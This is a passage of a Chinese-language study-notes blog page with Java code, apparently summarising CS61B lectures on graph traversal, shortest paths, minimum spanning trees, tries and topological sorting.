class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> V;  <span class="keyword">private</span> List&lt;Integer&gt;[] adj;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">int</span> V)</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.V = V;</span><br><span class="line">      adj = (List&lt;Integer&gt;[]) <span class="keyword">new</span> <span class="title class_">ArrayList</span>[V];</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> <span class="number">0</span>; v &lt; V; v++) &#123;</span><br><span class="line">         adj[v] = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEdge</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w)</span> &#123;</span><br><span class="line">      adj[v].add(w);</span><br><span class="line">      adj[w].add(v);</span><br><span class="line">      <span class="comment">// double size</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Iterable&lt;Integer&gt; <span class="title function_">adj</span><span class="params">(<span class="type">int</span> v)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> adj[v]; <span class="comment">// return a list</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>常见的设计模式：Decouple(解耦) type from processing algorithm</p><ol><li><p>三步走</p><ol><li>Create a graph object.</li><li>Pass the graph to a graph-processing method (or constructor) in a client class.</li><li>Query the client class for information.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// for example: dfsPaths</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DfsPaths</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">boolean</span>[] marked;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span>[] edgeTo; <span class="comment">// &quot;adjcency list&quot; in the path</span></span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> s; <span class="comment">// 从 s 开始遍历</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">DfsPaths</span><span class="params">(Graph G, <span class="type">int</span> s)</span> &#123;</span><br><span class="line">      <span class="comment">// initializing ...</span></span><br><span class="line">      dfs(G,s);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(Graph G, <span class="type">int</span> v)</span> &#123;</span><br><span class="line">      <span class="comment">// vertex visits (no more than V calls) -- O(v)</span></span><br><span class="line">      marked[v] = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> w: G.adj(v)) &#123;</span><br><span class="line">         <span class="comment">// edge considerations, each constant time</span></span><br><span class="line">         <span class="comment">// no more than 2E calls -- O(E)</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (!marked[w]) &#123;</span><br><span class="line">            edgeTo[w] = v; <span class="comment">// v可到的w</span></span><br><span class="line">            dfs(G,w); <span class="comment">// 进行遍历w邻居</span></span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Iterable&lt;Integer&gt; <span class="title function_">pathTo</span><span class="params">(<span class="type">int</span> v)</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!hasPathTo(v))</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 直接返回没有</span></span><br><span class="line">      List&lt;Integer&gt; Path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> v; x != s; x = edgeTo[x]) &#123;</span><br><span class="line">         <span class="comment">// 从目标开始往前找</span></span><br><span class="line">         path.add(x);</span><br><span class="line">      &#125;</span><br><span class="line">      path.add(s);</span><br><span class="line">      Collections.reverse(path);</span><br><span class="line">      <span class="comment">// 由于从目标开始往前找，所以要进行reverse</span></span><br><span class="line">      <span class="keyword">return</span> path;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">hasPathTo</span><span class="params">(<span class="type">int</span> v)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> markde[v];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">bfs</span><span class="params">(Graph G, <span class="type">int</span> s)</span> &#123;</span><br><span class="line">      Queue&lt;Integer&gt; fringe = </span><br><span class="line">              <span class="keyword">new</span> <span class="title class_">Queue</span>&lt;Integer&gt;();</span><br><span class="line">      fringe.enqueue(s);</span><br><span class="line">      marked[s] = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">while</span> (!fringe.isEmpty()) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> fringe.dequeue();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> w : G.adj(v)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (!marked[w]) &#123;</span><br><span class="line">            fringe.enqueue(w);</span><br><span class="line">            marked[w] = <span class="literal">true</span>;</span><br><span class="line">            edgeTo[w] = v;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>DFS cost 3 Models</p><ol><li>O(v): 不适用于多边图</li><li>O(E): 不适用于多点图</li><li>O(V+E): ok – 我们从未正式定义过多变量渐近学，而且结果证明它的定义有些不准确(not tight bound)</li><li>上述的实现dfs<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Graph_dfs.png" alt="上述的实现"></li></ol></li><li><p>BFS cost models</p><ol><li>bfs理论上时间复杂度和dfs相同，不同是bfs总是能找到最短的路径</li><li>上述的bfs<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Graph_bfs.png" alt="bfs"></li></ol></li><li><p>using adjecncy matrix<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Graph_adjMatrix.png" alt="using adjecncy matrix"></p></li></ol></li></ol></li><li><p>关于DFS</p><ol><li>ANY recursive algorithm can be implemented using iteration and a stack – 将bfs的queue变成stack</li></ol></li></ol><h3 id="6-3-Shortest-Paths"><a href="#6-3-Shortest-Paths" class="headerlink" title="6. 3 Shortest Paths"></a>6. 3 Shortest Paths</h3><ol><li>DFS or BFS?<ol><li>二者均可以遍历图，bfs可以在图中找到最小的路径，但是仅限于unweighted，每条边默认为1的情况<ol><li>BFS is worse for absurdly “bushy” graphs.</li><li>DFS is worse for spindly graphs.</li></ol></li></ol></li><li>最小路径树(SPT not MST): 详见dijkstra – Can find the SPT using Dijkstra’s algorithm.</li><li>Dijkstra(以下都是对于无负权重且联通图，可以是有环图)<ol><li>前期试探的不变量<ol><li>Invariant 1：找到抵达某个顶点(t)的最短路径–solution是没有环的(如果有环可以减掉)</li><li>Invariant 2: 每条到某个顶点的最短路都包含了到达涵盖其他点的最短路 – 从全局观点反证，如果不是，选最短会更短；同理，每条最短路都是在前一条最短路上加上当前的最短路</li><li>Invariant 3: 在一个连通图中，从某一个点到达其他所有顶点的最短路径是一颗树(Shortest Paths Tree:SPT)，而且总是有V-1个节点 – 有且只能由一条到达(可以是相等的，否则一定有大有小)</li></ol></li><li>试探性(2，3不懂可以看ppt)<ol><li>by Hand：其实是默认的dfs，只不过我们可以随时换方向</li><li>单纯的dfs：不可行</li><li>dfs+relaxation：也可能导致错误答案，生成的SPT是错误的</li></ol></li><li>Dijkstra: best first search<ol><li><p>Persudocode, <a href="https://docs.google.com/presentation/d/1_bw2z1ggUkquPdhl7gwdVBoTaoJmaZdpkV6MoAgxlJc/pub?start=false&loop=false&delayms=3000">showcase</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// data form: &#123;[0:+infinity], [1,+infinity], ...&#125;</span></span><br><span class="line">Dijkstra:</span><br><span class="line">   PQ.add(source, <span class="number">0</span>)</span><br><span class="line">   For other vertices v, PQ.add(v, infinity)</span><br><span class="line">   While PQ is not empty:</span><br><span class="line">      P = PQ.removeSmallest() <span class="comment">// 一开始一定是source</span></span><br><span class="line">      Relax all edges from P</span><br><span class="line"></span><br><span class="line">Relaxing:</span><br><span class="line">   <span class="keyword">if</span> distTo[p] + w &lt; distTo[q]:</span><br><span class="line">      distTo[q] = distTo[p] + w</span><br><span class="line">      edgeTo[q] = p  <span class="comment">// set the front</span></span><br><span class="line">      PQ.updatePriority(q,distTo[q])</span><br></pre></td></tr></table></figure></li><li><p>Invariants</p><ol><li>edgeTo[v] is the best known predecessor of v.(当前的)</li><li>distTo[v] is the best known total distance from source to v.(当前的)</li><li>PQ contains all unvisited vertices in order of distTo.(还没确定为最好的)</li><li>被移除(最开头)的肯定是最优选(回答了问题：为什么可以先移出来呢？) – 被移除的首先是当前最优，而由于没有负权重，以后要到达这个顶点一定是要更多条边，所以肯定最优的<ol><li><strong>解决的思路</strong>: 无法一下子从全局切入就回到这一步进行切入</li></ol></li><li>路径都可以通过edgeTo[destination]找到最开始的路径，因为会实时根据比较长度来确定某些节点的前一个节点(可以是两个节点的同一个节点)，最终会形成一条路径</li></ol></li><li><p>特点</p><ol><li>Always visits vertices in order of total distance from source.(按照)</li><li>Relaxation always fails on edges to visited (white) vertices. – Invariants 4中已经将清楚了</li><li>会平均地检测一切(遍历全部的边:贪心算法)，不像A*一样往一个方向进行试探性搜索</li><li>正确性证明<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Graph_dijkstraProof.png" alt="正确性证明"></li></ol></li><li><p>Runtime<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Graph_dijkstraRuntime.png" alt="Dijkstra’s Algorithm Runtime"></p></li></ol></li></ol></li><li>A*<ol><li>Simple idea: d(s,v) + h(v,destination)，其中h(..)是一个估计值 – A*算法的性能很大程度上取决于启发式函数h(x)的选择</li><li>A* Heuristic 根据经验&#x2F;其他信息进行运行，详细在CS188中(AI导论)</li></ol></li></ol><h3 id="6-4-Minimum-Spanning-Trees"><a href="#6-4-Minimum-Spanning-Trees" class="headerlink" title="6. 4 Minimum Spanning Trees"></a>6. 4 Minimum Spanning Trees</h3><ol><li>Determine whether a undirected graph contains cycles(是否有环)<ol><li>DFS: O(V+E) for worst, 需要经过所有点和边</li><li>WQU: 使用DisjointSet，对每条边检查是否已经connected，如果isConnected()，那么有环 – O(V + Eα(V))，如果有path compression的话</li></ol></li><li>Undirected Graph’s spanning tree(生成树)<ol><li>生成树: 连通、无环、所有点</li><li>最小生成树(MST): 权重和最小的生成树，最小生成树不唯一<ol><li>SPT和MST不一样，SPT取决于source node，MST是全局的没有source node – 关系: SPT 有时是 MST</li></ol></li></ol></li><li>连通无向MST<ol><li>Cut Property<ol><li>cut:切分是将图形节点分配到两个非空集合中(不用isConnected())，无共享节点</li><li>crossing edge:交叉边是将一个集合中的节点与另一个集合中的节点连接起来的边</li><li>切割属性：给定任何切割，最小权重交叉边都在 MST 中，proof below<ol><li>反证法，如果不是最小的交叉边，那换一下就变成更小了</li><li><strong>如何找到切割</strong>: 先假设不连通就好了(狗头)，先把边拿掉，也就是分成多个(两个)不同的部分</li></ol></li></ol></li><li>寻找MST<ol><li><p>Prim</p><ol><li><p>Runtime: assuming E &gt; V, we have O(E log V)</p><ol><li>Insertions: V, each costing O(log V) time</li><li>Delete-min: V, each costing O(log V) time.</li><li>DecreasePriority: E, each costing O(log V) time – 就是priorityQueue修改然后再重排</li></ol></li><li><p>代码示例</p><ol><li>如果edge一样随便选，MST有时并不唯一</li><li>Prim implementation code的特点是：只检查一条边一次，之前检查的先记录起来避免重复</li><li><a href="https://docs.google.com/presentation/d/1NFLbVeCuhhaZAM1z3s9zIYGGnhT4M4PWwAc-TLmCJjc/edit#slide=id.g32eeaa4a46_0_423">伪代码流程</a></li><li><a href="https://docs.google.com/presentation/d/1GPizbySYMsUhnXSXKvbqV4UhPCvrt750MiqPPgU-eCY/edit#slide=id.g9a60b2f52_0_205">实现代码流程</a></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Persudocode</span></span><br><span class="line"><span class="number">5.</span> start from arbitrary start node</span><br><span class="line"><span class="number">6.</span> repeatedly add shortest edge that has one node </span><br><span class="line">   inside the MST under construction.</span><br><span class="line">   (会有重复，后续具体代码实现可以改进)</span><br><span class="line"><span class="number">7.</span> Repeat until V-<span class="number">1</span> edges.</span><br><span class="line">Correctness: Cut Property</span><br><span class="line"></span><br><span class="line"><span class="comment">// Realistic Implementation Demo</span></span><br><span class="line">   <span class="comment">// dijkstra-like 计算边长而不是总长</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrimMST</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">PrimMST</span><span class="params">(WeightedGraph G)</span> &#123;</span><br><span class="line">      edgeTo = <span class="keyword">new</span> <span class="title class_">Edge</span>[G.V()];</span><br><span class="line">      distTo = <span class="keyword">new</span> <span class="title class_">double</span>[G.V()];</span><br><span class="line">      marked = <span class="keyword">new</span> <span class="title class_">boolean</span>[G.V()];</span><br><span class="line">      fringe = <span class="keyword">new</span> <span class="title class_">SpecialPQ</span>&lt;Double&gt;(G.V()); </span><br><span class="line"></span><br><span class="line">      distTo[s] = <span class="number">0.0</span>;</span><br><span class="line">      setDistancesToInfinityExceptS(s);</span><br><span class="line">      <span class="comment">// 选定source</span></span><br><span class="line">      insertAllVertices(fringe);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (!fringe.empty()) &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> fringe.delMin();</span><br><span class="line">         <span class="comment">// 已经确定的MST node, 就是min crossing edge</span></span><br><span class="line">         scan(G, v);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">scan</span><span class="params">(WeightedGraph G, <span class="type">int</span> v)</span> &#123;</span><br><span class="line">         marked[v] = <span class="literal">true</span>;</span><br><span class="line">         <span class="keyword">for</span> (Edge e: G.adj(v)) &#123;</span><br><span class="line">            <span class="comment">// 看看和最低点相邻的</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> e.other(v);</span><br><span class="line">            <span class="keyword">if</span> (marked[w]) &#123; <span class="keyword">continue</span>; &#125; </span><br><span class="line">            <span class="keyword">if</span> (e.weight() &lt; distTo[w]) &#123;</span><br><span class="line">               <span class="comment">// 随时更新，和dijkstra很像</span></span><br><span class="line">               distTo[w] = e.weight();</span><br><span class="line">               edgeTo[w] = e;</span><br><span class="line">               pq.decreasePriority(w, distTo[w]);</span><br><span class="line">               <span class="comment">// 重新排一下，只有最低才确定，否则只是更新</span></span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>Kruskal</p><ol><li><p>Runtime<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/MST_KruskalRuntime.png" alt="runtime"></p><ol><li>union和isConnected涉及路径压缩</li></ol></li><li><p>Code</p><ol><li>添加时会优先考虑最小边，形成环就丢弃，满足cut property</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// persudocode</span></span><br><span class="line">Initially mark all edges gray.</span><br><span class="line">Consider edges in increasing order of weight.</span><br><span class="line">Add edge to <span class="title function_">MST</span> <span class="params">(mark black)</span> unless doing so creates a cycle.</span><br><span class="line">Repeat until V-<span class="number">1</span> edges.</span><br><span class="line"></span><br><span class="line"><span class="comment">// realistic implementation</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KruskalMST</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> List&lt;Edge&gt; mst = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Edge&gt;();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">KruskalMST</span><span class="params">(EdgeWeightedGraph G)</span> &#123;</span><br><span class="line">      MinPQ&lt;Edge&gt; pq = <span class="keyword">new</span> <span class="title class_">MinPQ</span>&lt;Edge&gt;();</span><br><span class="line">      <span class="keyword">for</span> (Edge e : G.edges()) &#123;</span><br><span class="line">        pq.insert(e);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="type">WeightedQuickUnionPC</span> <span class="variable">uf</span> <span class="operator">=</span> </span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">WeightedQuickUnionPC</span>(G.V());</span><br><span class="line">      <span class="keyword">while</span> (!pq.isEmpty() &amp;&amp; mst.size() &lt; G.V() - <span class="number">1</span>) &#123;</span><br><span class="line">         <span class="type">Edge</span> <span class="variable">e</span> <span class="operator">=</span> pq.delMin();</span><br><span class="line">         <span class="type">int</span> <span class="variable">v</span> <span class="operator">=</span> e.from();</span><br><span class="line">         <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> e.to();</span><br><span class="line">         <span class="keyword">if</span> (!uf.connected(v, w)) &#123;</span><br><span class="line">            <span class="comment">// 检查是否为环，使用到Disjoint Sets</span></span><br><span class="line">            uf.union(v, w);</span><br><span class="line">            mst.add(e); </span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol></li></ol><h3 id="6-5-Range-Searching-and-Multi-Dimensional-Data"><a href="#6-5-Range-Searching-and-Multi-Dimensional-Data" class="headerlink" title="6. 5 Range Searching and Multi-Dimensional Data"></a>6. 5 Range Searching and Multi-Dimensional Data</h3><ol><li>K-D Tree<ol><li>best side优先到完</li><li>bad side测量最短距离桶min比，如果没有比他大的就进行剪枝</li></ol></li><li>uniform partitioning<ol><li>没有subspace</li></ol></li></ol><h3 id="6-6-Prefix-Operations-and-Tries"><a href="#6-6-Prefix-Operations-and-Tries" class="headerlink" title="6. 6 Prefix Operations and Tries"></a>6. 6 Prefix Operations and Tries</h3><ol><li>Stringed Set&#x2F;Map的另一种实现: Tries(Retrieval Tree)<ol><li>对于String keys<ol><li>将string拆分成为一个一个的char</li><li>共同的点(node)可以被共享</li><li>是否包含增加判断</li></ol></li><li>problem1: 如何判断是不是一个词<ol><li>到末尾时判断为F</li><li>都不一样，没在树里</li></ol></li><li>Code<ol><li><p>Implementation1: basic with array index</p><ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Tire_Array.png" alt="showcase"></li><li>第一“排”也可以是很多个节点&#x2F;array</li><li>Runtime<ol><li>Add: Θ(L)</li><li>Contains: O(L)</li></ol></li><li>Downside: 空间浪费比较多</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrieSet</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">R</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">   <span class="comment">// set a range !!! 是有范围的</span></span><br><span class="line">   <span class="keyword">private</span> Node root;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="type">boolean</span> isKey;</span><br><span class="line">      <span class="keyword">private</span> DataIndexCharMap&lt;Node&gt; next;</span><br><span class="line">      <span class="keyword">private</span> <span class="title function_">Node</span><span class="params">(<span class="type">boolean</span> c, <span class="type">int</span> R)</span> &#123;</span><br><span class="line">         isKey = c;</span><br><span class="line">         next = <span class="keyword">new</span> <span class="title class_">DataIndexedCharMap</span>&lt;Node&gt;(R);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataIndexedCharMap</span>&lt;V&gt; &#123;</span><br><span class="line">      <span class="keyword">private</span> V[] items;</span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">DataIndexedCharMap</span><span class="params">(<span class="type">int</span> R)</span> &#123;</span><br><span class="line">         items = (V[]) <span class="keyword">new</span> <span class="title class_">Object</span>[R];</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>other Implementation</p><ol><li>hashtable: 需要摊销，几乎一样快<ol><li>Hash Table is O(R), where R is size of alphabet</li></ol></li><li>BST(不一定要是Binary了)：比较慢一点，但是内存少</li></ol></li></ol></li></ol></li><li><strong>现实</strong><ol><li>虽然是O(1)，但是要把字符串拆开来一个一个匹配，不一定比hashing快</li><li>实际用处<ol><li><p>前缀匹配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// collect all keys persudocode</span></span><br><span class="line">collect():</span><br><span class="line">   Create an empty list of results x.</span><br><span class="line">   For character c in root.next.keys():</span><br><span class="line">      Call <span class="title function_">colHelp</span><span class="params">(“c”, x, root.next.get(c)</span>).</span><br><span class="line">   Return x.</span><br><span class="line">      </span><br><span class="line">colHelp(String s, List&lt;String&gt; x, Node n):</span><br><span class="line">   If n.isKey, then x.add(s).</span><br><span class="line">   For character c in n.next.keys():</span><br><span class="line">      Call <span class="title function_">colHelp</span><span class="params">(s + c, x, n.next.get(c)</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// keysWithPrefix</span></span><br><span class="line">keysWithPrefix()</span><br><span class="line">   Find the node α corresponding to the <span class="title function_">string</span> <span class="params">(in pink)</span>.</span><br><span class="line">   Create an empty list x.</span><br><span class="line">   For character c in α.next.keys():</span><br><span class="line">      Call <span class="title function_">colHelp</span><span class="params">(“sa” + c, x, α.next.get(c)</span>)</span><br></pre></td></tr></table></figure></li><li><p>AutoComplete</p><ol><li>Value represents how important Google thinks that string is – 使用权重</li><li>Each node stores its own value, as well as the value of its best substring</li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Trie_AutoComplete.png" alt="pic"></li></ol></li></ol></li><li>other:There are many other types of string sets&#x2F;maps out there.<ol><li>Suffix Trees (Link).</li><li>DAWG (Link).</li></ol></li></ol></li></ol><h3 id="6-7-DAGs-Reduction-Decomposition"><a href="#6-7-DAGs-Reduction-Decomposition" class="headerlink" title="6. 7 DAGs, Reduction, Decomposition"></a>6. 7 DAGs, Reduction, Decomposition</h3><ol><li><p><a href="https://docs.google.com/presentation/d/1Bvf4PooGooUCr-K9cA1kbhsNc0hXW5Jwn-QD0in-1pc/edit#slide=id.g55ec4e88d2_1_1309">graph summary</a></p></li><li><p>本届内容对于DAGs(有向无环图成立)，图的边权重可以为负的 – 算法可以运行，但是没有依赖关系，没有意义</p></li><li><p>Topological Sorting</p><ol><li>一个图中节点的排列有顺序<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Topo_name.png" alt="showcass"></li><li>how to find?<ol><li><p>solution1: DFS traversal(现在有两个含义了)</p><ol><li>成立原理: dfs postorder(最后才到source) + marked(唯一性)</li><li>time O(V+E), space theta(V)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// persudocode</span></span><br><span class="line"><span class="number">3.</span> Perform a DFS traversal from every vertex with indegree <span class="number">0</span>,</span><br><span class="line">and NOT clearing markings in between traversals.</span><br><span class="line"><span class="number">4.</span> Record DFS postorder in a list.</span><br><span class="line"><span class="number">5.</span> Topological ordering is given by the reverse of that <span class="title function_">list</span> <span class="params">(reverse postorder)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">// improved persudocode</span></span><br><span class="line">   <span class="comment">// 无需找到入度为0的</span></span><br><span class="line">Run DFS from an arbitrary vertex.</span><br><span class="line">If not all marked, pick an unmarked vertex and <span class="keyword">do</span> it again.</span><br><span class="line">Repeat until done</span><br></pre></td></tr></table></figure></li></ol></li></ol></li><li><p>Shortest Path in DAGs: using the topological sort solution as a subroutine</p><ol><li>without negative – dijkstra</li><li>with negative – visit v in topological order<ol><li><p>不能使用dijkstra是因为不会realx负后不会再relax后面节点的总长度 – 本质：无法确保每一次选取的点是最优的</p></li><li><p>为什么可以使用topological order – 本质：拓扑顺序的访问是唯一的，Each vertex is visited only when all possible info about it has been used，使得经过某个点的时候已经可以确定到这个点的最短路径了</p><ol><li><a href="https://docs.google.com/presentation/d/1CfnLS3FSXV8X2sXPTravZGXeBUUkcFQv7Uf2iGWGUfs/edit#slide=id.g55eae46bdb_0_456">演示</a></li><li>time complexity: O(V+E), space complexity: theta(V)</li></ol><figure class="highlight java"><table><tr><td 